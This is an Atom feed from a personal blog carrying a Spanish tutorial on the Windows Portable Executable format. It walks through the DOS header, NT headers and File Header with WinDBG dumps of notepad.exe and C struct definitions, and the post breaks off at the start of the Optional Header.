<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title>My Blog</title>
	<subtitle>My blog site.</subtitle>
	<link rel="self" type="application/atom+xml" href="https://example.com/posts/feed.xml"/>
  <link rel="alternate" type="text/html" href="https://example.com/posts/"/>
  
	<updated>2025-11-12T00:00:00+00:00</updated>
	
	<id>https://example.com/posts/feed.xml</id>
	<entry xml:lang="en">
		<title>Análisis del formato PE</title>
		<published>2025-11-12T00:00:00+00:00</published>
		<updated>2025-11-12T00:00:00+00:00</updated>
		<link rel="alternate" type="text/html" href="https://example.com/posts/encabezado-pe/"/>
		<id>https://example.com/posts/encabezado-pe/</id>
    
		<content type="html" xml:base="https://example.com/posts/encabezado-pe/">&lt;p&gt;Portable Executable (PE) es el formato de archivo para ejecutables en Windows. Algunos ejemplos de extensiones de archivos PE son .exe, .dll, .sys y .scr.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;encabezado-pe&#x2F;intro.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dos-header&quot;&gt;DOS Header&lt;a class=&quot;zola-anchor&quot; href=&quot;#dos-header&quot; aria-label=&quot;Anchor link for: dos-header&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;El primer encabezado de un archivo PE siempre comienza con los dos bytes &lt;code&gt;0x4D&lt;&#x2F;code&gt;, y &lt;code&gt;0x5A&lt;&#x2F;code&gt;, que son comunmente conocido como &lt;code&gt;MZ&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Estos dos bytes representan la firma del encabezado DOS que se utiliza para confirmar que el archivo que se está analizando es un archivo PE válido.&lt;&#x2F;p&gt;
&lt;p&gt;El encabezado PE es una estuctura de datos, que está definida de la siguiente manera.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dt _IMAGE_DOS_HEADER
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;combase!_IMAGE_DOS_HEADER
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 e_magic          : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x002 e_cblp           : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 e_cp             : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x006 e_crlc           : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 e_cparhdr        : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00a e_minalloc       : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c e_maxalloc       : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00e e_ss             : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x010 e_sp             : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x012 e_csum           : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 e_ip             : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x016 e_cs             : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 e_lfarlc         : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01a e_ovno           : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c e_res            : [4] Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 e_oemid          : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x026 e_oeminfo        : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 e_res2           : [10] Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x03c e_lfanew         : Int4B
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Los miembros más importante de la estructura, son &lt;code&gt;e_magic&lt;&#x2F;code&gt; y &lt;code&gt;e_lfanew&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;e_magic&lt;&#x2F;code&gt; es un valor de 2 bytes con un valor fijo de &lt;code&gt;0x5A4D&lt;&#x2F;code&gt; o MZ.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;encabezado-pe&#x2F;1-mz.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;e_lfanew&lt;&#x2F;code&gt; es un valor de 4 bytes que contiene el desplazamiento hacia el inicio del encabezado &lt;code&gt;NT Header&lt;&#x2F;code&gt;, además, siempre se encuentra en el mismo desplazamiento &lt;code&gt;0x03c&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Para poder ver &lt;code&gt;e_lfanew&lt;&#x2F;code&gt;, podemos hacerlo mediante WinDBG:&lt;&#x2F;p&gt;
&lt;p&gt;Primero vemos cual es la dirección basde de notepad.exe.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; lm m notepad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Browse full module list
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220000 0024d000   notepad    (pdb symbols)          C:\ProgramData\Dbg\sym\notepad.pdb\D3C0E3074D9E4A993BBCC8ACFC85120D1\notepad.pdb
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Volcamos de nuevo la estructura de &lt;code&gt;_IMAGE_DOS_HEADER&lt;&#x2F;code&gt;, pero añadiendo la dirección base.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dt _IMAGE_DOS_HEADER 00220000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;combase!_IMAGE_DOS_HEADER
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 e_magic          : 0x5a4d
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x002 e_cblp           : 0x90
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 e_cp             : 3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x006 e_crlc           : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 e_cparhdr        : 4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00a e_minalloc       : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c e_maxalloc       : 0xffff
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00e e_ss             : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x010 e_sp             : 0xb8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x012 e_csum           : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 e_ip             : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x016 e_cs             : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 e_lfarlc         : 0x40
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01a e_ovno           : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c e_res            : [4] 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 e_oemid          : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x026 e_oeminfo        : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 e_res2           : [10] 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x03c e_lfanew         : 0n240
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; ? 0n240
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 240 = 000000f0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Evaluamos la instrucción y obtenemos el valor &lt;code&gt;0xf0&lt;&#x2F;code&gt;, por lo tanto nt_heaaders estará en el desplazamiento &lt;code&gt;002200f0&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; db 002200f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;002200f0  50 45 00 00 4c 01 06 00-02 ad ab 47 00 00 00 00  PE..L......G....
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220100  00 00 00 00 e0 00 02 01-0b 01 0e 14 00 20 02 00  ............. ..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220110  00 74 00 00 00 00 00 00-70 17 02 00 00 10 00 00  .t......p.......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220120  00 30 02 00 00 00 22 00-00 10 00 00 00 02 00 00  .0....&amp;quot;.........
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220130  0a 00 00 00 0a 00 00 00-0a 00 00 00 00 00 00 00  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220140  00 d0 02 00 00 04 00 00-50 53 03 00 02 00 40 c1  ........PS....@.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220150  00 00 04 00 00 10 01 00-00 00 10 00 00 10 00 00  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00220160  00 00 00 00 10 00 00 00-00 00 00 00 00 00 00 00  ................
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;PE&lt;&#x2F;code&gt; indica el inicio de &lt;code&gt;NT_HEADERS&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Podemos apreciar, que estamos ante el inicio de &lt;code&gt;IMAGE_NT_HEADERS&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dt IMAGE_NT_HEADERS 002200f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;combase!IMAGE_NT_HEADERS
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 Signature        : 0x4550
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 FileHeader       : _IMAGE_FILE_HEADER
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;dos-stub&quot;&gt;DOS Stub&lt;a class=&quot;zola-anchor&quot; href=&quot;#dos-stub&quot; aria-label=&quot;Anchor link for: dos-stub&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Antes de pasar a la estructura del encabezado &lt;code&gt;NT&lt;&#x2F;code&gt;, se encuentra el &lt;strong&gt;DOS stub&lt;&#x2F;strong&gt;, que es un mensaje de error que muestra:
&lt;code&gt;&quot;This program cannot be run in DOS mode&quot;&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Cabe destacar que este mensaje de error puede ser modificado por el programador en tiempo de compilación. Esto no forma parte del encabezado &lt;code&gt;PE&lt;&#x2F;code&gt;, pero es importante tenerlo en cuenta.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;nt-header-image-nt-headers&quot;&gt;NT Header (IMAGE_NT_HEADERS)&lt;a class=&quot;zola-anchor&quot; href=&quot;#nt-header-image-nt-headers&quot; aria-label=&quot;Anchor link for: nt-header-image-nt-headers&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;El encabezado &lt;strong&gt;NT&lt;&#x2F;strong&gt; es esencial, ya que incorpora otros dos encabezados de imagen: &lt;code&gt;FileHeader&lt;&#x2F;code&gt; y &lt;code&gt;OptionalHeader&lt;&#x2F;code&gt;, los cuales contienen una gran cantidad de información sobre el archivo &lt;code&gt;PE&lt;&#x2F;code&gt;. De forma similar al encabezado &lt;strong&gt;DOS&lt;&#x2F;strong&gt;, el encabezado NT contiene un miembro de &lt;code&gt;signature&lt;&#x2F;code&gt; que se utiliza para verificar su validez.&lt;&#x2F;p&gt;
&lt;p&gt;Normalmente, este elemento de firma es igual a la cadena &lt;code&gt;&quot;PE&quot;&lt;&#x2F;code&gt;, que está representada por los bytes &lt;code&gt;0x50&lt;&#x2F;code&gt; y &lt;code&gt;0x45&lt;&#x2F;code&gt; como hemos podido ver anteriormente. Sin embargo, dado que la firma es de tipo de dato &lt;code&gt;DWORD&lt;&#x2F;code&gt; (4 bytes), se representa como &lt;code&gt;0x50450000&lt;&#x2F;code&gt; (Siempre es igual), que sigue siendo &lt;code&gt;&quot;PE&quot;&lt;&#x2F;code&gt;, pero con dos bytes nulos de relleno.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;002200f0  50 45 00 00 4c 01 06 00-02 ad ab 47 00 00 00 00  PE..L......G....
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El encabezado NT puede localizarse utilizando el miembro &lt;code&gt;e_lfanew&lt;&#x2F;code&gt; dentro del encabezado DOS. La estructura del encabezado NT varía dependiendo de la arquitectura de la máquina.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;32 Bits&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_NT_HEADERS &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                   Signature&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  IMAGE_FILE_HEADER       FileHeader&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  IMAGE_OPTIONAL_HEADER32 OptionalHeader&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_NT_HEADERS32&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_NT_HEADERS32&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;64 Bits&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_NT_HEADERS64 &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;                   Signature&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;    IMAGE_FILE_HEADER       FileHeader&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;    IMAGE_OPTIONAL_HEADER64 OptionalHeader&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_NT_HEADERS64&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_NT_HEADERS64&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;file-header-image-file-header&quot;&gt;File Header (IMAGE_FILE_HEADER)&lt;a class=&quot;zola-anchor&quot; href=&quot;#file-header-image-file-header&quot; aria-label=&quot;Anchor link for: file-header-image-file-header&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Pasando al siguiente encabezado, el cual puede accederse a partir de la estructura de datos del encabezado NT.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_FILE_HEADER &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;  Machine&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;  NumberOfSections&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; TimeDateStamp&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; PointerToSymbolTable&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; NumberOfSymbols&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;  SizeOfOptionalHeader&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;  &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;  Characteristics&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-c&quot;&gt;=&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_FILE_HEADER&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_FILE_HEADER&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Los miembros más importantes de la estructura son:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;NumberOfSections&lt;&#x2F;code&gt; – El número de secciones en el archivo &lt;code&gt;PE&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Characteristics&lt;&#x2F;code&gt; – Son &quot;banderas&quot; que especifican ciertos atributos del archivo ejecutable, como si es una biblioteca de enlace dinámico (&lt;code&gt;DLL&lt;&#x2F;code&gt;) o una aplicación de consola.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;SizeOfOptionalHeader&lt;&#x2F;code&gt; – El tamaño del encabezado opcional que sigue a continuación&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;rich-header&quot;&gt;Rich Header&lt;a class=&quot;zola-anchor&quot; href=&quot;#rich-header&quot; aria-label=&quot;Anchor link for: rich-header&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Este encabezado solo aparece cuando se compila una aplicación con visual studio, se puede modificar, por lo tanto no aparecerá en todos los ejecutables PE, solo en los creados con visual studio.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;optional-header&quot;&gt;Optional Header&lt;a class=&quot;zola-anchor&quot; href=&quot;#optional-header&quot; aria-label=&quot;Anchor link for: optional-header&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;El encabezado opcional Optional Header es importante y, aunque se le llama &quot;opcional&quot;, en realidad es esencial para la ejecución de un archivo &lt;code&gt;PE&lt;&#x2F;code&gt;. Se le denomina &quot;opcional&quot; porque algunos tipos de archivos no lo incluyen. Este encabezado tiene dos versiones: una para sistemas de 32 bits y otra para sistemas de 64 bits. Ambas versiones tienen miembros casi idénticos en su estructura de datos, con la principal diferencia en el tamaño de algunos de esos miembros.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;En la versión de &lt;strong&gt;64 bits&lt;&#x2F;strong&gt;, se utiliza &lt;code&gt;ULONGLONG&lt;&#x2F;code&gt; para representar valores grandes.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;En la versión de &lt;strong&gt;32 bits&lt;&#x2F;strong&gt;, se utiliza &lt;code&gt;DWORD&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Además, la versión de 32 bits contiene algunos miembros que no se encuentran en la versión de 64 bits.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_OPTIONAL_HEADER &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-double-slash z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-c&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt; 32 bits
